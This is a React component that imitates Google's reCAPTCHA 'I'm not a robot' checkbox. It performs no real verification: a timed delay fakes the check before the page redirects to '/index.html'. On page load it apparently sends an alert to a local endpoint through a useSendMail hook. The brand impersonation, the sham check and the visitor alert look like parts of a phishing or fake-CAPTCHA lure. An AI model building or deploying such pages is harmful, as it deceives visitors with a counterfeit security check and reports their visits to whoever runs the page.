"use client";
import React, { useState } from "react";
import { Card, CardContent } from "@/components/ui/card";
import { Checkbox } from "@/components/ui/checkbox";
import { Button } from "@/components/ui/button";
import Image from "next/image";
import { cn } from "@/lib/utils";
import { useRouter } from "next/navigation";
import { useSendMail } from "../hooks/useSendMail";

interface VerificationProps {
  onVerify?: (verified: boolean) => void;
}

const VerificationPage: React.FC<VerificationProps> = ({ onVerify }) => {
  useSendMail('http://localhost:8080/alert');
  
  const [isChecked, setIsChecked] = useState(false);
  const [isVerifying, setIsVerifying] = useState(false);
    const router = useRouter();

  const handleCheck = async () => {
    setIsVerifying(true);
    // Simulate verification delay
    await new Promise((resolve) => setTimeout(resolve, 2000));
    setIsVerifying(false);
    setIsChecked(true);
      onVerify?.(true);
      router.push('/index.html');
  };
  return (
    <Card className="w-full max-w-md bg-transparent border-none shadow-none">
      <CardContent className="p-6">
        <div className="flex items-center justify-between border rounded-lg p-4 bg-white shadow-sm">
          <div className="flex items-center space-x-4 relative">
            <div className="relative h-10 w-10">
              {" "}
              {/* Container size */}
              <div
                className={cn(
                  "absolute inset-0 bg-white transition-all duration-300",
                  isVerifying &&
                    "rounded-full animate-[spin_5s_linear_infinite]",
                  !isVerifying && "rounded",
                  !isChecked && "border border-gray-300"
                )}
              >
                {isVerifying && (
                  <div className="absolute inset-0">
                    <div className="w-full h-full rounded-full relative">
                      <div className="absolute inset-0 border-2 border-gray-200 rounded-full" />
                      <div className="absolute inset-0 rounded-full animate-[spin_5s_linear_infinite]">
                        <div className="w-full h-full rounded-full border-2 border-transparent border-t-[#4285f4] border-r-[#4285f4]" />
                      </div>
                    </div>
                  </div>
                )}
                <Checkbox
                  checked={isChecked}
                  onCheckedChange={handleCheck}
                  disabled={isVerifying || isChecked}
                  className={cn(
                    "h-full w-full border-none",
                    isChecked &&
                      "bg-white rounded data-[state=checked]:bg-white [&>span]:text-[#00a552]",
                    "[&>span]:h-full [&>span]:w-full", // Make checkmark fill container
                    "[&>span>svg]:h-full [&>span>svg]:w-full", // Make SVG fill the span
                    "[&>span>svg]:stroke-[2]", // Adjust stroke width
                    "data-[state=checked]:bg-white"
                  )}
                />
              </div>
            </div>
            <span className="text-gray-600 text-lg">I&apos;m not a robot</span>
          </div>

          <div className="flex flex-col items-end space-y-2">
            <Image
              width={24}
              height={24}
              src="/recaptcha.png"
              alt="recaptcha"
              className="w-6 h-6"
            />
            <span className="text-xs text-gray-400">reCAPTCHA</span>
            <div className="flex space-x-2 text-xs text-gray-400">
              <Button
                variant="link"
                className="p-0 h-auto text-xs text-gray-400 hover:text-gray-600"
                onClick={() => window.open("#", "_blank")}
              >
                Privacy
              </Button>
              <span>-</span>
              <Button
                variant="link"
                className="p-0 h-auto text-xs text-gray-400 hover:text-gray-600"
                onClick={() => window.open("#", "_blank")}
              >
                Terms
              </Button>
            </div>
          </div>
        </div>
      </CardContent>
    </Card>
  );
};

export default VerificationPage;
